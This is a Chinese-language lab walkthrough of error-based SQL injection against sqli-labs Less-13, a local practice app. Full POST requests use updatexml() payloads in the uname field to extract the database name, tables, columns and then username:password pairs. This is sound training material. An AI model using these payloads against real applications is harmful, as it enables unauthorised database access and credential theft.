# sqli-labs Less-13 报错注入复现

Less-13 是典型的 **POST 型报错注入**，核心特点是：

- 提交方式：POST（需构造表单数据）

- 闭合方式：`')`（单引号+右括号）

- 无回显：登录失败无账号密码提示，需通过数据库报错提取信息

- 注入点：`uname` 参数

---

#### 一、环境准备

1. 启动 sqli-labs 环境，访问 Less-13 页面：

    ```Plain Text
    
    http://127.0.0.1/sqli-labs/Less-13/
    ```

2. 工具准备：Burp Suite（抓包改包）或浏览器开发者工具（直接修改 POST 请求）

---

#### 二、核心步骤（报错注入流程）

##### 1. 确认闭合方式 ✅

构造 payload 测试闭合逻辑：

```HTTP

POST /sqli-labs/Less-13/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

passwd=admin&submit=Submit&uname=')#
```

- 若登录成功，说明闭合方式为 `')`（`#` 注释掉后续 SQL 语句）

- 原 SQL 逻辑：`SELECT * FROM users WHERE username=('')#') AND password=('admin')`

---

##### 2. 爆库名（获取当前数据库）

利用 `updatexml()` 函数触发报错，提取数据库名：

```HTTP

POST /sqli-labs/Less-13/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

passwd=admin&submit=Submit&uname=') or updatexml(1,concat(0x7e,database()),1)#
```

- 预期报错：`XPATH syntax error: '~security'`

- 提取结果：数据库名为 `security`

---

##### 3. 爆表名（获取当前库下所有表）

构造 payload 提取表名：

```HTTP

POST /sqli-labs/Less-13/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

passwd=admin&submit=Submit&uname=') or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1)#
```

- 预期报错：`XPATH syntax error: '~emails,referers,uagents,users'`

- 提取结果：目标表为 `users`

---

##### 4. 爆列名（获取目标表的列）

构造 payload 提取 `users` 表的列名：

```HTTP

POST /sqli-labs/Less-13/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

passwd=admin&submit=Submit&uname=') or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users')),1)#
```

- 预期报错：`XPATH syntax error: '~id,username,password'`

- 提取结果：关键列 `username`、`password`

---

##### 5. 脱库（获取账号密码）

通过 `limit` 逐行提取 `users` 表数据：

```HTTP

POST /sqli-labs/Less-13/ HTTP/1.1
Host: 127.0.0.1
Content-Type: application/x-www-form-urlencoded

passwd=admin&submit=Submit&uname=') or updatexml(1,concat(0x7e,(select concat(username,':',password) from users limit 0,1)),1)#
```

- 预期报错：`XPATH syntax error: '~Dumb:Dumb'`（第一条数据）

- 逐行提取：修改 `limit 1,1`、`limit 2,1`… 可获取所有账号密码（如 `Angelina:I-kill-you`、`Admin:admin` 等）

---

#### 三、工具操作示例（Burp Suite）

1. 打开 Burp Suite，设置代理，拦截浏览器请求

2. 访问 Less-13，输入任意账号密码，Burp 抓到 POST 包

3. 修改 `uname` 参数为对应 payload，点击「Send」

4. 在响应中查看报错信息，提取注入结果

---

#### 四、关键原理

- **updatexml() 报错注入**：利用 MySQL 中 `updatexml()` 函数对 XPath 格式的严格校验，构造非法 XPath 表达式触发报错，将查询结果嵌入报错信息中提取。

- **闭合逻辑**：`')` 用于闭合原 SQL 中的 `('`，`#` 用于注释后续语句，确保注入 payload 生效。


> （注：文档部分内容可能由 AI 生成）